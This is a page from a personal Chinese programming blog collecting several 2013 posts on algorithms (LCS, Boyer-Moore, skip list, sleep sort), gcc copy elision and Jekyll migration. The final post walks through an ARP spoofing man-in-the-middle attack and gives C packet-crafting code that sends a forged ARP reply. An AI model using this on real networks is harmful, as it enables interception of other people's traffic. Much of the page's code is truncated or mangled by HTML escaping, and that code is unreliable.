
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>snorlax's Homepage</title>
    
    <meta name="author" content="Xinzheng Zhang">

    <!-- Enable responsive viewport -->
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <!-- Le HTML5 shim, for IE6-8 support of HTML elements -->
    <!--[if lt IE 9]>
      <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

    <!-- Le styles -->
    <link href="/assets/themes/twitter/bootstrap/css/bootstrap.2.2.2.min.css" rel="stylesheet">
    <link href="/assets/themes/twitter/css/style.css?body=1" rel="stylesheet" type="text/css" media="all">
    <link href="/assets/themes/twitter/css/pygments.css?body=1" rel="stylesheet" type="text/css" media="all">
    <!-- Le fav and touch icons -->
  <!-- Update these with your own images
    <link rel="shortcut icon" href="images/favicon.ico">
    <link rel="apple-touch-icon" href="images/apple-touch-icon.png">
    <link rel="apple-touch-icon" sizes="72x72" href="images/apple-touch-icon-72x72.png">
    <link rel="apple-touch-icon" sizes="114x114" href="images/apple-touch-icon-114x114.png">
  -->

    <!-- atom & rss feed -->
    <link href="" type="application/atom+xml" rel="alternate" title="Sitewide ATOM Feed">
    <link href="/rss.xml" type="application/rss+xml" rel="alternate" title="Sitewide RSS Feed">

  </head>

  <body>
    <div class="navbar">
      <div class="navbar-inner">
        <div class="container-narrow">
          <a class="brand" href="/">Snorlax's blog</a>
          <ul class="nav">
            
            
            


  
    
      
      	
      	<li><a href="/about.html">About me</a></li>
      	
      
    
  
    
      
      	
      	<li><a href="/archive.html">Archives</a></li>
      	
      
    
  
    
      
    
  
    
      
    
  
    
      
    
  
    
      
    
  
    
      
    
  
    
      
    
  
    
      
    
  
    
      
    
  




          </ul>
        </div>
      </div>
    </div>
    <div class="container_wrapper">
      <div class="container-narrow">
        <div class="content">
          <!-- <ul class="listing"> -->

<div class="page-header">
  <h3><a href="/program/2013/05/08/%E6%9C%80%E5%A4%A7%E5%85%AC%E5%85%B1%E4%B8%8A%E5%8D%87%E5%AD%90%E5%BA%8F%E5%88%97lcs-python%E5%AE%9E%E7%8E%B0">最大公共上升子序列(lcs) python实现 </a></h3>
  <div class="date">
    <span>08 May 2013</span>
  </div>
</div>

<div class="row-fluid post-full">
  <div class="span12">
    <div class="content">
      <p>mit 算法导论公开课 15集<br />
http://v.163.com/movie/2010/12/L/4/M6UTT5U0I_M6V2U1HL4.html</p>

<p>实现了求出所有的lcs</p>
<div class="highlight"><pre><code class="language-text" data-lang="text">import copy
import sys
#stringa=&quot;abcbdab&quot;
#stringb=&quot;bdcaba&quot;

stringa=sys.argv[1]
stringb=sys.argv[2]
lena=len(stringa)
lenb=len(stringb)

mapl=[[0 for _ in xrange(lena+1)] for _ in xrange(lenb+1)]
path=[]
for i in xrange(1,lenb+1):
    for j in xrange(1,lena+1):
        if stringa[j-1]==stringb[i-1]:
            mapl[i][j]=mapl[i-1][j-1]+1
            path.append((i,j))
        else:
            mapl[i][j]=max(mapl[i-1][j],mapl[i][j-1])
#for i in mapl:
#   print i
#print path
if len(path)==0:
    print &quot;no lcs&quot;
else:
    backdatestack=[[(lenb,lena),[]]]
    while len(backdatestack)!=0:
        top=backdatestack.pop()
        ansstack=top[1]
        lcs=mapl[top[0][0]][top[0][1]]
        i=top[0][0]
        j=top[0][1]
        while lcs!=0:
            try:
                ind=path.index((i,j))
                ansstack.append(stringb[i-1])
                i-=1
                j-=1
                lcs-=1
            except ValueError:
                if mapl[i-1][j]&gt;&gt;mapl[i][j-1]:&lt;br /&gt;
                    i-=1&lt;br /&gt;
                elif mapl[i-1][j]&lt;mapl[i][j-1]:&lt;br /&gt;
                    j-=1&lt;br /&gt;
                else:&lt;br /&gt;
                    backdatestack.append([(i-1,j),copy.copy(ansstack)])&lt;br /&gt;
                    j-=1&lt;br /&gt;
        while len(ansstack)!=0:&lt;br /&gt;
            print ansstack.pop(),&lt;br /&gt;
        print &lt;/p&gt;

&lt;p&gt;&lt;/p&gt;
</code></pre></div>
    </div>

  
    <ul class="tag_box inline">
      <li><i class="icon-folder-open"></i></li>
      
      


  
    
    	<li><a href="#program-ref">
    		program <span>43</span>
    	</a></li>
    
  



    </ul>
  

  
    <ul class="tag_box inline">
      <li><i class="icon-tags"></i></li>
      
      


  
    
  



    </ul>
  
  </div>
</div>


<div class="page-header">
  <h3><a href="/program/2013/05/06/boyer-moore%E7%AE%97%E6%B3%95-python%E5%AE%9E%E7%8E%B0">Boyer-Moore算法 python实现 </a></h3>
  <div class="date">
    <span>06 May 2013</span>
  </div>
</div>

<div class="row-fluid post-full">
  <div class="span12">
    <div class="content">
      <p><p>看了<a href="http://www.ruanyifeng.com/blog/2013/05/boyer-moore_string_search_algorithm.html?utm_source=feedly">字符串匹配的Boyer-Moore算法</a>后觉得很有用就写一个实现了一下</p>
<div class="highlight"><pre><code class="language-text" data-lang="text">def badcharrule(ori,sear):
    if len(ori)!=len(sear):
        print &quot;error&quot;
    else:
        le=len(ori)
        badindex=-1
        lastindex=-1
        for i in xrange(le-1,0,-1):
            if ori[i]==sear[i]:
                pass
            else:
                badindex=i
                break
        if badindex==-1:
            pass
        else:
            for i in xrange(0,le):
                if sear[i]==ori[badindex]:
                    lastindex=i
                    break
                else:
                    pass
        return badindex-lastindex
def goodpostfixrule(ori,sear):
    if len(ori)!=len(sear):
        print &quot;error&quot;
    else:
        le=len(ori)
        postfix=0
        for i in xrange(le-1,0,-1):
            if ori[i]==sear[i]:
                postfix+=1
            else:
                break
        if postfix==0:
            return -1
        else:
            postfixstring=sear[-postfix:]
            restori=sear[:-postfix]
            if restori.find(postfixstring)==-1:
                restori=postfixstring[:-1]+restori
                if restori.find(postfixstring)==-1:
                    return -1
                else:
                    return len(sear)-restori.find(postfixstring)-1
            else:
                return len(sear)-restori.find(postfixstring)-len(postfixstring)

def movestep(ori,sear):
    gu=badcharrule(ori,sear)
    if gu==0:
        return 0
    else:
        return max(gu,goodpostfixrule(ori,sear))

oristring=&quot;here is a simple example&quot;
searchstring=&quot;example&quot;

index=0
while index+len(searchstring)
    move=movestep(oristring[index:index+len(searchstring)],searchstring)
    if move==0:
        print &quot;find it index=%s&quot; %index
        index+=len(searchstring)
    else:
        index+=move
print &quot;search over&quot;

&gt;
</code></pre></div>
    </div>

  
    <ul class="tag_box inline">
      <li><i class="icon-folder-open"></i></li>
      
      


  
    
    	<li><a href="#program-ref">
    		program <span>43</span>
    	</a></li>
    
  



    </ul>
  

  
    <ul class="tag_box inline">
      <li><i class="icon-tags"></i></li>
      
      


  
    
  



    </ul>
  
  </div>
</div>


<div class="page-header">
  <h3><a href="/program/2013/05/05/%E8%B7%B3%E8%A1%A8python%E5%AE%9E%E7%8E%B0">跳表python实现 </a></h3>
  <div class="date">
    <span>05 May 2013</span>
  </div>
</div>

<div class="row-fluid post-full">
  <div class="span12">
    <div class="content">
      <p>最近在看算法导论发现跳表好像一直没实现过……所以闲来无视就写了个python的实现<br />
详细介绍可看网易公开课算法导论第12集跳跃表<br />
http://v.163.com/special/opencourse/algorithms.html</p>

<p><p>然后把代码贴上</p>
<div class="highlight"><pre><code class="language-text" data-lang="text">import sys
import random
mineast=-sys.maxint
class Node(object):
    def __init__(self,value=mineast,rightp=None,leftp=None,upp=None,downp=None):
        self.value=value
        self.rightp=rightp
        self.leftp=leftp
        self.upp=upp
        self.downp=downp
    def __del__(self):
        self.value=None
        self.rightp=None
        self.leftp=None
        self.upp=None
        self.downp=None
class skipTable(object):
    def __init__(self):
        self.lefthead=Node()
    def __del__(self):
        t=self.lefthead
        headlist=[]
        while t:
            headlist.append(t)
            t=t.downp
        for i in headlist:
            while i:
                dd=i
                i=i.rightp
                del(dd)

    def findlowestLayer(self,newvalue):
        tmphead=self.lefthead
        tmpans=[]
        while tmphead.downp:
            while tmphead.rightp:
                if tmphead.rightp.value&amp;gt;newvalue:
                    break
                else:
                    tmphead=tmphead.rightp
            tmpans.append(tmphead)
            tmphead=tmphead.downp
        tmpans.append(tmphead)
        return tmpans
    def getCurrentLayerInsertLoc(self,Head,newvalue):
        tmphead=Head
        while(tmphead.rightp):
            if tmphead.rightp.value&amp;gt;newvalue:
                return tmphead
            else:
                tmphead=tmphead.rightp
        return tmphead
    def randomup(self):
        if random.randint(0,1)==0:
            return False
        else:
            return True
    def adjustnode(self,prefixNode,value):
        newnode=Node(value,prefixNode.rightp,prefixNode,None,None)
        if prefixNode.rightp:
            prefixNode.rightp.leftp=newnode
            prefixNode.rightp=newnode
        else:
            prefixNode.rightp=newnode
        return newnode
    def adjustnodepor(self,prefixNode,downNode,value):
        newnode=Node(value,prefixNode.rightp,prefixNode,None,downNode)
        downNode.upp=newnode
        if prefixNode.rightp:
            prefixNode.rightp.leftp=newnode
            prefixNode.rightp=newnode
        else:
            prefixNode.rightp=newnode
        return newnode
    def insert(self,value):
        lowestlayerNode=self.findlowestLayer(value)
        loc=self.getCurrentLayerInsertLoc(lowestlayerNode.pop(),value)
        downNode=self.adjustnode(loc,value)
        while self.randomup():
            #print &quot;up %s&quot; %value
            if(len(lowestlayerNode)!=0):
                downNode=self.adjustnodepor(lowestlayerNode.pop(),downNode,value)
            else:
                newnode=Node()
                newnode.downp=self.lefthead
                self.lefthead.upp=newnode
                self.lefthead=newnode
                downNode=self.adjustnodepor(newnode,downNode,value)
    def delete(self,value):
        lowestlayerNode=self.findlowestLayer(value)
        loc=self.getCurrentLayerInsertLoc(lowestlayerNode.pop(),value)
        lowestlayerNode.append(loc)
        for i in lowestlayerNode:
            if i.value==value:
                if i.rightp:
                    i.leftp.rightp=i.rightp
                    i.rightp.leftp=i.leftp
                    del(i)
                else:
                    i.leftp.rightp=None
                    del(i)
    def find(self,value):
        tmphead=self.lefthead
        while tmphead.downp:
            while tmphead.rightp:
                if tmphead.rightp.value&amp;gt;value:
                    break
                elif tmphead.rightp.value==value:
                    print &quot;find&quot;
                    return
                else:
                    tmphead=tmphead.rightp
            tmphead=tmphead.downp
        while tmphead.rightp:
            if tmphead.rightp.value==value:
                print &quot;find&quot;
                return
            tmphead=tmphead.rightp
        if tmphead.value==value:
            print &quot;find&quot;
            return
        else:
            print &quot;not find&quot;
            return

sk=skipTable()
for i in xrange(100):
    sk.insert(random.randint(0,100))
for i in xrange(20):
    sk.delete(random.randint(0,100))

t=sk.lefthead
headlist=[]
while t:
    headlist.append(t)
    t=t.downp
for i in headlist:
    while i:
        print i.value,
        i=i.rightp
    print
sk.find(101)
del(sk)
&gt;
</code></pre></div>
    </div>

  
    <ul class="tag_box inline">
      <li><i class="icon-folder-open"></i></li>
      
      


  
    
    	<li><a href="#program-ref">
    		program <span>43</span>
    	</a></li>
    
  



    </ul>
  

  
    <ul class="tag_box inline">
      <li><i class="icon-tags"></i></li>
      
      


  
    
  



    </ul>
  
  </div>
</div>


<div class="page-header">
  <h3><a href="/2013/04/26/%E5%85%B3%E4%BA%8Eprotocol-buffer-%E4%B8%AD%E7%9A%84base-128-varints%E7%BC%96%E7%A0%81">关于protocol Buffer 中的base 128 Varints编码 </a></h3>
  <div class="date">
    <span>26 April 2013</span>
  </div>
</div>

<div class="row-fluid post-full">
  <div class="span12">
    <div class="content">
      <h3>工作</h3>

<ol>
<li>host在github上</li>
<li>安装jekyll bootstrap~~简称jb~~</li>
<li>导出wordpress评论以及内容</li>
<li>处理wordpress的内容转化为markdown</li>
<li>注意事项</li>
</ol>

<h4><a href="https://pages.github.com/">host在github上</a></h4>

<ol>
<li>新建一个username.github.io的repo</li>
<li><a href="https://help.github.com/articles/setting-up-a-custom-domain-with-github-pages">绑定域名</a></li>
</ol>

<h4><a href="http://jekyllbootstrap.com/">安装<del>jb</del></a></h4>

<ol>
<li>安装jekyll</li>
<li>clone代码 并看一下sample的样例以及api</li>
</ol>

<hr>

<h4>导出wordpress评论以及内容</h4>

<ul>
<li>导出评论

<ul>
<li>由于github page采用的是纯静态的、评论这种那么麻烦的东西索性还是交给第三方好啦= =在github上我使用的是<a href="http://disqus.com/">disqus</a>，他也同时提供从wordpress导出的功能</li>
<li>创建 disqus账号 <disqus.com/admin/create></li>
<li>添加自己的site并安装wp插件 <a href="http://wordpress.org/plugins/disqus-comment-system/">http://wordpress.org/plugins/disqus-comment-system/</a></li>
<li>等待disques后台进程帮你抓完会通知你的</li>
</ul></li>
<li>导出内容

<ul>
<li>导出content 使用wordpress的导出工具导出xml即可</li>
</ul></li>
</ul>

<h4>转换内容</h4>

<ul>
<li><p>导出mark down</p>

<ul>
<li><del>jekyll 有一个jekyll-import 的工具、不过中文支持的巨差无比</del></li>
<li>使用一个改进过对中文支持的版本 <a href="https://gist.github.com/chitsaou/1394128">https://gist.github.com/chitsaou/1394128</a></li>
<li>导出的xml命名 (wordpress.xml) 如下命令会把为你生成一拖post 以及wordpress中的page
<code>ruby
ruby -r &quot;./wordpressdotcom.rb&quot; -e &quot;Jekyll::WordpressDotCom.process&quot;
</code></li>
<li>如果在wordpress中没有使用什么插件类似<strong>codebox</strong>这样的到这一步就导入成功了</li>
<li>如果使用了一些奇怪的语法在html用插件解出来的格式就一塌糊涂了，比如我的所有的代码都是用codebox的……
写了一段简单的脚本来处理html，基本思路都是文本解析到codebox的开始标签pre然后替换掉
<code>python
__author__ = &#39;zhangxinzheng&#39;
# -*- coding: utf-8 -*-
import sys
import re
import os
def f(filename):
if filename.find(&quot;html&quot;) == -1:
return
targetName = filename.replace(&quot;html&quot;,&quot;md&quot;)
fd = open(filename, &quot;r+&quot;)
str = &#39;&#39;.join(fd.readlines())
while str.find(&quot;&lt;pre&quot;) != -1:
tempString=&quot;\n</code>\n&quot;
isContent = False
startIndex = str.find(&quot;<pre")
endIndex = len(str)
realEnd = startIndex
leftCount = 1
rightCount = 0
for j in xrange(startIndex, endIndex):
    if str[j] == '<':
        isContent = False
        leftCount +=1
    if isContent:
        tempString+=str[j]
    if str[j] == '>&#39;:
        isContent = True
        rightCount +=1
        realEnd = j
    if leftCount == rightCount:
        break
str+=&quot;\n```\n&quot;
str=str.replace(str[startIndex:realEnd], tempString)
fd.close()</li>
</ul>

<p>fd = open(targetName, &quot;w+&quot;)
fd.write(str)
fd.close()
os.remove(filename)</p></li>
</ul>

<p>if <strong>name</strong> == &quot;<strong>main</strong>&quot;:
    for i in sys.argv:
        f(i)
  ```</p>

    </div>

  
    <ul class="tag_box inline">
      <li><i class="icon-folder-open"></i></li>
      
      


  
    
  



    </ul>
  

  
    <ul class="tag_box inline">
      <li><i class="icon-tags"></i></li>
      
      


  
    
  



    </ul>
  
  </div>
</div>


<div class="page-header">
  <h3><a href="/program/2013/04/09/list%E4%B8%AD%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E4%B8%89%E8%A7%92%E5%BD%A2%E4%B8%89%E8%BE%B9">list中判断是否存在三角形三边 </a></h3>
  <div class="date">
    <span>09 April 2013</span>
  </div>
</div>

<div class="row-fluid post-full">
  <div class="span12">
    <div class="content">
      <p><p>小时候数学好、因为能够有感觉知道每个条件他存在的意义、到了大学这种感觉渐渐消失了、直到今天突然那种感觉就回来了、因为那些条件恰恰是隐藏在数学自己的本身……<br />
--------------------------------------------------------------------------<br />
把这个感觉带回给我的恰恰就是这么一道题、这道题真的非常非常简单、可是给我带来了不小的顿悟。原题大致是先图里求个最短路径然后判断路径中是否有可以组成三角形的存在<br />
也就是拆出了这么一个子问题、不知道是计算机编程写多了还是怎么样、已经逐渐开始依赖计算机强大的计算脑子都没半动一下就开始O(n<sup>3)的暴力</sup></p>
<div class="highlight"><pre><code class="language-text" data-lang="text">for(int a=0; a
拿脚趾头想三次方肯定要TL、接着就是开始改进、首先想到了还是先对这些有意义的数组进行排序。然后使用自然而然的递增数组自己的优势那就是最小的两边之差一定是存在与相邻的数字里、注意这里就利用到了数字这个自身拥有美丽的属性的东西的属性。然后差不多代码是这样的

for (int a = 0; a  (pval[j+1]-pval[j]))
        {
            flag=true;
        }
    }
}

复杂度是O(n^2)当我们使用了数字他自身的属性后、也就是相当于他自身的一个条件、我们把一个复杂度进行了指数级别的下降、这是多么美妙的事情？当然还没有完、因为我们还有一个隐藏条件
首先想想我们如何判定一个三角形
1.所有任意两边之和大于第三边
2.存在任意两边之差小于第三边
条件1其实就等于是3个条件、为什么对判断同一个东西却判断的条件不同？原因就是存在于他们的符号、因为减法这个运算他本身就更为苛刻破坏了数字之间那种稳定的感觉（对不起我实在没有专业知识来说明这个感觉是什么）而看起来要判断三次的加法就非常好的维护了这个感觉、也就是我们小时候做数学的那种条件是正正好好的感觉、只是现在他们隐藏于了数字本身
所以最终的代码其实非常简单



for(int i=0;i
{
    if(pval[i]+pval[i+1] &gt; pv[i+2])
        break;
}

通过数字他自身我们其实只需要O(n)足已
&gt;
</code></pre></div>
    </div>

  
    <ul class="tag_box inline">
      <li><i class="icon-folder-open"></i></li>
      
      


  
    
    	<li><a href="#program-ref">
    		program <span>43</span>
    	</a></li>
    
  



    </ul>
  

  
    <ul class="tag_box inline">
      <li><i class="icon-tags"></i></li>
      
      


  
    
  



    </ul>
  
  </div>
</div>


<div class="page-header">
  <h3><a href="/program/2013/04/04/beauty-of-programming-%E7%BB%83%E4%B9%A0%E8%B5%9B%E7%AC%AC%E4%B8%89%E9%A2%98">beauty of programming 练习赛第三题 </a></h3>
  <div class="date">
    <span>04 April 2013</span>
  </div>
</div>

<div class="row-fluid post-full">
  <div class="span12">
    <div class="content">
      <p>先看题</p>

<p><h4>题目列表 > 踩方格</h4>
</p>

<p><div class="coding-problem">     <br />
    <p>时间限制: 1000ms    内存限制: 1024MB</p>
<div class="highlight"><pre><code class="language-text" data-lang="text">&lt;p /&gt;&lt;h3&gt;描述&lt;/h3&gt;&lt;p&gt;有一个方格矩阵，矩阵边界在无穷远处。我们做如下假设：&lt;br /&gt;a.    每走一步时，只能从当前方格移动一格，走到某个相邻的方格上；&lt;br /&gt;b.    走过的格子立即塌陷无法再走第二次；&lt;br /&gt;c.    只能向北、东、西三个方向走；&lt;br /&gt;请问：如果允许在方格矩阵上走n步，共有多少种不同的方案。2种走法只要有一步不一样，即被认为是不同的方案。&lt;/p&gt;&lt;h3&gt;输入&lt;/h3&gt;&lt;p&gt;允许在方格上行走的步数n&lt;/p&gt;&lt;h3&gt;输出&lt;/h3&gt;&lt;p&gt;计算出的方案数量&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;对于小数据1 &amp;lt;= n &amp;lt;= 20; 对于大数据1 &amp;lt;= n &amp;lt;= 100.&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;/div&gt;&lt;/p&gt;
&lt;dl class=&quot;content&quot;&gt;
    &lt;dt&gt;样例输入&lt;/dt&gt;
    &lt;dd&gt;
</code></pre></div><div class="highlight"><pre><code class="language-text" data-lang="text">2
        样例输出
        7


这个题目我觉得最大的阴谋就是对于小数据1
我了个fuck了给了个那么小规模的数据还给那么高的分值正常人理所当然的就肯定认为这是个指数级的运算了啊！然后我就想到了三叉树去暴力啊、可是再怎么暴力这个指数摆在那就算是100也很恐怖了、各种挂……纠结了好久好久写了好几种都挂
最后静下心来把他当数学做……然后草稿纸写写……尼玛5分钟就算出来了……
其实思想非常非常简单 往北的节点就是能叉出3条路、其中分别是继续叉2的2条以及继续叉3的一条、往两侧的每次只能叉出两条路、分别是2 和3 具体路径的结构问你了么？去暴力做等于就是浪费这些路径的信息啊小时候怎么做数学题的……要那么多条件吃屎啊……数学规律就是这么简单……然后还不会写么？……！你妹的别说100了来个平方这复杂度都闭着眼睛来的啊……

#include
int main(){
    int a=0;
    int b=1;
    int count＝0;
    int i=0;
    int temp;
    scanf(&quot;%d&quot;,&amp;count);
    for (i=0; i
没了！没了！写完了！……………………突然有种回归最质朴的感觉真好……
&gt;
</code></pre></div>
    </div>

  
    <ul class="tag_box inline">
      <li><i class="icon-folder-open"></i></li>
      
      


  
    
    	<li><a href="#program-ref">
    		program <span>43</span>
    	</a></li>
    
  



    </ul>
  

  
    <ul class="tag_box inline">
      <li><i class="icon-tags"></i></li>
      
      


  
    
  



    </ul>
  
  </div>
</div>


<div class="page-header">
  <h3><a href="/program/2013/03/29/%E7%9D%A1%E7%9C%A0%E6%8E%92%E5%BA%8Fshell%E5%AE%9E%E7%8E%B0">睡眠排序shell实现 </a></h3>
  <div class="date">
    <span>29 March 2013</span>
  </div>
</div>

<div class="row-fluid post-full">
  <div class="span12">
    <div class="content">
      <p><p>又是无意看到群里在讨论东西看到个睡眠排序……觉得好玩的就分享分享<br />
代码如下（简单的过分 想说的话都写注释里了)</p>
<div class="highlight"><pre><code class="language-text" data-lang="text">#!/bin/bash
function f() {
    sleep &quot;$1&quot;
    echo &quot;$1&quot;  
}
while [ -n &quot;$1&quot; ]
do
    f &quot;$1&quot; &amp;
    shift   #对所有参数 依次循环让所有的参数分别sleep进行次根据sleep长短利用数字自身大小的特性进行排序
done
wait  #主进程等到全部子进程结束后返回结束
#这个排序有个致命伤 如果os调度高于了数字最小的差值比如就必定会出错 或者随便来个来自系统的别的竞争也肯定悲剧了
#还有就是……万一这个数字很大你等到明年去么混蛋= =

&gt;
</code></pre></div>
    </div>

  
    <ul class="tag_box inline">
      <li><i class="icon-folder-open"></i></li>
      
      


  
    
    	<li><a href="#program-ref">
    		program <span>43</span>
    	</a></li>
    
  



    </ul>
  

  
    <ul class="tag_box inline">
      <li><i class="icon-tags"></i></li>
      
      


  
    
  



    </ul>
  
  </div>
</div>


<div class="page-header">
  <h3><a href="/program/2013/03/28/%E5%85%B3%E4%BA%8Egcc%E4%BC%98%E5%8C%96%E6%8B%B7%E8%B4%9D%E6%9E%84%E9%80%A0-5">关于gcc优化拷贝构造 </a></h3>
  <div class="date">
    <span>28 March 2013</span>
  </div>
</div>

<div class="row-fluid post-full">
  <div class="span12">
    <div class="content">
      <p><p>今天碰到一个很奇怪的问题……(我大一的时候怎么没有发觉呢Orz<br />
代码如下</p>
<div class="highlight"><pre><code class="language-text" data-lang="text">#include
using namespace std;
class Student {

public:
    Student(){cout

        cout
    }
    ~Student(){

        cout
    Student  operator + (const Student &amp;) const
    {
        Student temp;
        return temp;
    }
};
int main(int argc, const char * argv[])
{

    Student s1;
    Student s2(s1+s1);
    return 0;
}

输出应该很简单
------------------
structure
structure
copy structure
free
copy structure
free
free
free
-----------------
return 返回临时变量时应该拷贝构造一次
可是问题来了 死活出的结果就是
----------------
structure
structure
free
free
----------------
折腾了大半天后我终于还是发现原来还是编译器搞的鬼……(人家只是太智能不要黑他
具体就是在return temp;那里应该隐式调用拷贝构造的地方编译器做了延长temp的生命周期、延长到外部s2来让s2的生命周期结束后对这块内存进行析构
这样就可以少了第一次拷贝构造
此时第二次需要把新对象拷贝到s2中时的拷贝也就在这里被一起优化掉了直接让s2对应到了temp这块内存上(以上是我对编译器优化过程的的猜测
然后我就试着
g++ -o test -O0 test.cpp
这么编译还是不行
于是我就放弃了(只好理解成gcc的最白痴的不进行优化编译也会处理掉这种隐式的拷贝构造
但是我错了！！！
我严重鄙视下大多数网上放gcc参数的文档的那些人不负责任的就是-O0就是不优化（混蛋不优化不等于最低级优化好么！
-----------------
然后终于在帮忙下找到了http://blog.csdn.net/daidodo/article/details/2185217这篇文章
-fno-elide-constructors 强制g++总是调用copy构造函数，即使在用临时对象初始化另一个同类型对象的时候。
就是这个参数
好了一切其实也就搞定了
g++ -o test -fno-elide-constructors test.cpp

结束语:怪也只能怪gcc太尼玛智能了……我大概知道为什么开始教学中要用vc环境了
&gt;
</code></pre></div>
    </div>

  
    <ul class="tag_box inline">
      <li><i class="icon-folder-open"></i></li>
      
      


  
    
    	<li><a href="#program-ref">
    		program <span>43</span>
    	</a></li>
    
  



    </ul>
  

  
    <ul class="tag_box inline">
      <li><i class="icon-tags"></i></li>
      
      


  
    
  



    </ul>
  
  </div>
</div>


<div class="page-header">
  <h3><a href="/life/2013/03/26/%E6%B3%A8%E5%86%8C%E4%BA%86-ask-fm">注册了 ask.fm </a></h3>
  <div class="date">
    <span>26 March 2013</span>
  </div>
</div>

<div class="row-fluid post-full">
  <div class="span12">
    <div class="content">
      <p><a href="http://ask.fm/ZhangXinZheng" target="_blank">http://ask.fm/ZhangXinZheng</a>
一个人自问自答好无聊、求骚扰</p>

    </div>

  
    <ul class="tag_box inline">
      <li><i class="icon-folder-open"></i></li>
      
      


  
    
    	<li><a href="#life-ref">
    		life <span>5</span>
    	</a></li>
    
  



    </ul>
  

  
    <ul class="tag_box inline">
      <li><i class="icon-tags"></i></li>
      
      


  
    
  



    </ul>
  
  </div>
</div>


<div class="page-header">
  <h3><a href="/program/2013/03/20/arp%E6%AC%BA%E9%AA%97%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB%E7%9A%84%E5%AE%9E%E7%8E%B0%E3%80%81arp%E5%8C%85%E8%A7%A3%E6%9E%90">arp欺骗中间人攻击的实现、arp包解析 </a></h3>
  <div class="date">
    <span>20 March 2013</span>
  </div>
</div>

<div class="row-fluid post-full">
  <div class="span12">
    <div class="content">
      <p>首先先是了解下什么arp欺骗 可以参加这篇文章http://www.ahstu.edu.cn/wlzx/HTML/20090923173022.shtml<br />
看完这篇文章我们就可以实施攻击<br />
1.首先登陆自己的路由器 先对自己准备攻击的机器获得mac地址的信息（在真正攻击时需要用嗅探广发同个子网下的arp广播来获得mac地址）<br />
2.对被攻击的mac地址绑定静态ip（这步在真正攻击时并不需要、我只是为了方便）<br />
3.在路由器中进行绑定把被攻击者的ip的绑定到攻击者的mac地址（在真正攻击时对路由器发送欺骗的ARP欺骗响应在之后会说到）<br />
4.对被攻击者发送arp欺骗应答使之网关的mac地址映射到攻击者的机器上或者简单的 arp -s attack's mac gateway就可以了<br />
------------------ARP表的设置基本完成----------------------------------------------------------------------------<br />
接下去需要打开自己网卡的路由功能（这个可以简单的打开共享网络来做到)<br />
然后开个wireshark什么就安安静静的看着来回所有的数据全给抓到就可以了:P<br />
------------------上面只是理想情况是你知道路由器密码别的情况你该怎么办？被攻击的人能老老实实给你用他电脑么?------------<br />
接下去我们要分析下arp数据包<a href="http://snorlax-wordpress.stor.sinaapp.com/uploads/2013/03/54A4717D-5EB0-4B9A-9D84-10A71FC0A72C.jpg"><img src="http://snorlax-wordpress.stor.sinaapp.com/uploads/2013/03/54A4717D-5EB0-4B9A-9D84-10A71FC0A72C.jpg" alt="" title="54A4717D-5EB0-4B9A-9D84-10A71FC0A72C" width="680" height="232" class="alignnone size-full wp-image-299" /></a>
然后我从真实抓下来的arp进行分析<br />
首先arp广播包是 42个字节<br />
arp响应包是60个字节(后面18个我实在没搞明白是什么……反正我乱填也是成功就是的了<br />
然后我贴代码对这42个字节进行具体分析<br />
因为socket的封装都在ip之上的……unp上查到的sock_packet我在mac上死活也没找到= =<br />
不过我发现给在数据连路层上的更好的一组东西:)<br />
神器不解释啊= =<br />
详见<br />
http://dog.tele.jp/winpcapeng/html/group__wpcap__fn.html</p>

<p><p>
```</p>

<h1>include</h1>

<h1>include</h1>

<h1>include</h1>

<p>int main(int argc, char **argv) {
    pcap_t *fp;
    char error[PCAP_ERRBUF_SIZE];
    u_char packet[60];
    int i;</p>
<div class="highlight"><pre><code class="language-text" data-lang="text">/* Check the validity of the command line */
if (argc != 2)
{
    printf(&quot;usage: %s inerface&quot;, argv[0]);
    return -1;
}

/* Open the output adapter */
if((fp = pcap_open_live(&quot;en0&quot;, 100, 1, 1000, error) ) == NULL)
{
    fprintf(stderr,&quot;\nError opening adapter: %s\n&quot;, error);
    return -1;
}

/* Supposing to be on ethernet, set mac destination to 1:1:1:1:1:1 */
/*被攻击者的mac*/
packet[0]=xx;
packet[1]=32;
packet[2]=102;
packet[3]=8;
packet[4]=jiubu;
packet[5]=gaosuni;

/* set mac source to 2:2:2:2:2:2 */
/*攻击者的mac*/
packet[6]=jiu;
packet[7]=bu;
packet[8]=gaosu;
packet[9]=234;
packet[10]=xx;
packet[11]=100;
/*arp*/
packet[12]=8;
packet[13]=6;
/*arp首部*/
packet[14]=0;
packet[15]=1;

packet[16]=8;
packet[17]=0;

packet[18]=6;
packet[19]=4;
packet[20]=0;
packet[21]=2;
/*被骗的那个人的arp表上的假mac*/
packet[22]=jiu;
packet[23]=154;
packet[24]=32;
packet[25]=bu;
packet[26]=253;
packet[27]=gao;
/*被骗者的网关*/
packet[28]=192;
packet[29]=168;
packet[30]=1;
packet[31]=1;
/*被攻击者的mac*/
packet[32]=xx;
packet[33]=32;
packet[34]=102;
packet[35]=xx;
packet[36]=xx;
packet[37]=184;
/*被攻击者的ip*/
packet[38]=192;
packet[39]=168;
packet[40]=1;
packet[41]=114;

/* Fill the rest of the packet */
/*乱填就好了*/
for(i=42;i
    packet[i]=i%256;
}

/* Send down the packet */
pcap_sendpacket(fp,
                packet,
                60);

return 0;
</code></pre></div>
<p>}</p>

<p>以上arp欺骗的完整实现、不要用来干坏事= =</p>

<blockquote>
</blockquote>

    </div>

  
    <ul class="tag_box inline">
      <li><i class="icon-folder-open"></i></li>
      
      


  
    
    	<li><a href="#program-ref">
    		program <span>43</span>
    	</a></li>
    
  



    </ul>
  

  
    <ul class="tag_box inline">
      <li><i class="icon-tags"></i></li>
      
      


  
    
  



    </ul>
  
  </div>
</div>


<!-- </ul> -->

<div id="post-pagination" class="paginator">

  
    
    <a href="/"><前页</a>
    
  

      
      <a href="/">1</a>
      

    
      
      <span class="current-page">2</span>
      
    
      
      <a href="/page3">3</a>
      
    
      
      <a href="/page4">4</a>
      
    
      
      <a href="/page5">5</a>
      
    
      
      <a href="/page6">6</a>
      
    

  
    <a class="next" href="/page3">后页</a>
  
  (共55篇)
</div>

        </div>
        <hr>
        <footer>
          <p>&copy; 2014 Xinzheng ZhangPowered by Jekyll @ GitHub
          </p>
